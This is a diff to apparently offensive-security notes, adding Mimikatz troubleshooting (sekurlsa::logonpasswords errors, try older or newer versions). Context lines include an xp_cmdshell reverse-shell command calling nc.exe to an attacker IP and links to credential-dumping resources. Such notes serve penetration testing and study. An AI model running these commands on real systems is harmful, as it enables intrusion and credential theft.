@@ -630,6 +630,12 @@ EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md<br>
 https://github.com/gentilkiwi/mimikatz
 
+
+
+```
+ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
+```
+
 - UAC-bypass
 
 If we are already in the administrators group but are unable to execute Mimikatz.
@@ -847,13 +853,19 @@ modify KeyBlock to KeyBlockV4
 ImportError: cannot import name 'KeyBlock' from 'impacket.krb5.ccache'
 ```
 
-mimikatz
+Mimikatz
 
-try using old version
+Try using an older version.
 
 ```
 sekurlsa::logonpasswords
 mimikatz # ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
+```
+
+Try using the latest version.
+
+```
+mimikatz # ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
 ```
 
 ### :open_file_folder: Test Environment
